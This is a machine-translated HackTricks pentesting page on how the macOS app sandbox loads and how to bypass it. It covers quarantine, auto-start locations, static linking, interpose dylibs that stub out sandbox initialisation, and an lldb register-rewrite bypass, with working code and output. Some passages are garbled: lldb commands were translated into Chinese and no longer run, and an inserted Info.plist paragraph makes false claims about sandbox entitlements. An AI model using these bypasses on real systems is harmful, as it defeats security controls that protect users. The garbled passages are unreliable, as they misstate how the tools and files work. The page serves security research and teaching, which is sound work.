# macOS沙盒调试与绕过

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

## 沙盒加载过程

<figure><img src="../../../../../.gitbook/assets/image (2) (1) (2).png" alt=""><figcaption><p>图片来源：<a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

在上图中，可以看到当运行具有权限`com.apple.security.app-sandbox`的应用程序时，**沙盒将如何加载**。

编译器将`/usr/lib/libSystem.B.dylib`链接到二进制文件。

然后，**`libSystem.B`**将调用其他几个函数，直到**`xpc_pipe_routine`**将应用程序的权限发送给**`securityd`**。Securityd检查进程是否应该被隔离在沙盒中，如果是，则将被隔离。
最后，通过调用**`__sandbox_ms`**激活沙盒，该函数将调用**`__mac_syscall`**。

## 可能的绕过方法

### 绕过隔离属性

**由沙盒进程创建的文件**会附加**隔离属性**，以防止沙盒逃逸。然而，如果你设法在沙盒应用程序中**创建一个没有隔离属性的`.app`包**，并使应用程序包的二进制文件指向**`/bin/bash`**，并在**plist**中添加一些环境变量来滥用launchctl以**无沙盒方式启动新应用程序**。

这就是[**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)中所做的事情。

### 滥用Open功能

在[**Word沙盒绕过的最后几个示例**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv)中可以看到如何滥用**`open`**命令行功能来绕过沙盒。

### 滥用自动启动位置

如果沙盒进程可以在**稍后将要运行二进制文件的非沙盒应用程序的位置写入**，它将能够通过将二进制文件放置在那里来**逃逸**。这种位置的一个很好的例子是`~/Library/LaunchAgents`或`/System/Library/LaunchDaemons`。

对于这个过程，你可能需要**两个步骤**：使具有**更宽松沙盒**（`file-read*`，`file-write*`）的进程执行你的代码，实际上会写入一个将以**无沙盒方式执行**的位置。

查看关于**自动启动位置**的页面：

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

### 滥用其他进程

如果从沙盒进程中能够**入侵运行在较少限制沙盒（或无沙盒）中的其他进程**，你将能够逃逸到它们的沙盒中：

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

### 静态编译和动态链接

[**这项研究**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)发现了两种绕过沙盒的方法。因为沙盒是在用户空间加载**libSystem**库时应用的。如果一个二进制文件能够避免加载它，它就永远不会被沙盒化：

* 如果二进制文件是**完全静态编译**的，它可以避免加载该库。
* 如果**二进制文件不需要加载任何库**（因为链接器也在libSystem中），它就不需要加载libSystem。

### Shellcode

请注意，即使是ARM64的**shellcode**也需要链接到`libSystem.dylib`：
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### 权限

请注意，即使某些**操作**在应用程序具有特定**权限**的情况下可能被**允许在沙盒中执行**，例如：
```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```
### Interposting Bypass

有关**Interposting**的更多信息，请查看：

{% content-ref url="../../../mac-os-architecture/macos-function-hooking.md" %}
[macos-function-hooking.md](../../../mac-os-architecture/macos-function-hooking.md)
{% endcontent-ref %}

#### Interpost `_libsecinit_initializer` 以防止沙盒化
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### 拦截 `__mac_syscall` 以防止沙盒

{% code title="interpose.c" %}
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```
{% endcode %}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### 使用lldb调试和绕过沙盒

让我们编译一个应该被沙盒化的应用程序：

{% tabs %}
{% tab title="sand.c" %}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{% tab title="entitlements.xml" %}

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.security.app-sandbox</key>
    <true/>
    <key>com.apple.security.network.client</key>
    <true/>
    <key>com.apple.security.files.user-selected.read-write</key>
    <true/>
    <key>com.apple.security.files.user-selected.read-only</key>
    <true/>
    <key>com.apple.security.files.all</key>
    <true/>
    <key>com.apple.security.print</key>
    <true/>
    <key>com.apple.security.temporary-exception.apple-events</key>
    <array>
        <string>com.apple.dt.Xcode</string>
    </array>
</dict>
</plist>
```

这是一个示例的 entitlements.xml 文件，其中包含了一些常见的沙盒权限。在这个文件中，我们可以看到以下权限：

- `com.apple.security.app-sandbox`：启用应用沙盒。
- `com.apple.security.network.client`：允许应用进行网络通信。
- `com.apple.security.files.user-selected.read-write`：允许应用读写用户选择的文件。
- `com.apple.security.files.user-selected.read-only`：允许应用只读用户选择的文件。
- `com.apple.security.files.all`：允许应用访问所有文件。
- `com.apple.security.print`：允许应用进行打印操作。
- `com.apple.security.temporary-exception.apple-events`：允许应用在特定情况下使用苹果事件。

通过在 entitlements.xml 文件中定义这些权限，我们可以控制应用在沙盒环境中的行为和访问权限。

{% endtab %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{% tab title="Info.plist" %}

## Info.plist

The `Info.plist` file is an essential component of a macOS application's bundle. It contains metadata about the application, including its name, version, and supported capabilities. In the context of macOS sandboxing, the `Info.plist` file is used to define the sandbox entitlements and restrictions for the application.

To debug or bypass the macOS sandbox, it is necessary to modify the `Info.plist` file to remove or weaken the sandbox restrictions. This can be achieved by editing the file directly or by using tools like `plutil` to modify the file programmatically.

When modifying the `Info.plist` file, it is important to understand the implications and potential security risks. Weakening or removing sandbox restrictions can expose the application to unauthorized access or privilege escalation.

To prevent unauthorized modifications to the `Info.plist` file, it is recommended to implement proper code signing and entitlements verification mechanisms. This ensures that only trusted modifications are allowed and prevents potential sandbox bypasses.

{% endtab %}
```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

然后编译应用程序：

{% code overflow="wrap" %}
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
{% endcode %}

{% hint style="danger" %}
该应用程序将尝试**读取**文件**`~/Desktop/del.txt`**，而**沙盒不允许**这样做。\
在那里创建一个文件，一旦绕过沙盒，它就能够读取它：
```bash
echo "Sandbox Bypassed" > ~/Desktop/del.txt
```
{% endhint %}

让我们调试应用程序，查看沙盒何时加载：
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp
# 通过修改一些寄存器来绕过跳转到b.lo地址
(lldb) 断点删除 1 # 移除断点
(lldb) 寄存器写入 $pc 0x187659928 # b.lo地址
(lldb) 寄存器写入 $x0 0x00
(lldb) 寄存器写入 $x1 0x00
(lldb) 寄存器写入 $x16 0x17d
(lldb) c
进程 2517 恢复
绕过沙盒！
进程 2517 以状态 0 (0x00000000) 退出
{% hint style="warning" %}
**即使绕过了沙盒，TCC** 也会询问用户是否允许进程读取桌面上的文件
{% endhint %}

## 参考资料

* [http://newosxbook.com/files/HITSB.pdf](http://newosxbook.com/files/HITSB.pdf)
* [https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
* [https://www.youtube.com/watch?v=mG715HcDgO8](https://www.youtube.com/watch?v=mG715HcDgO8)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
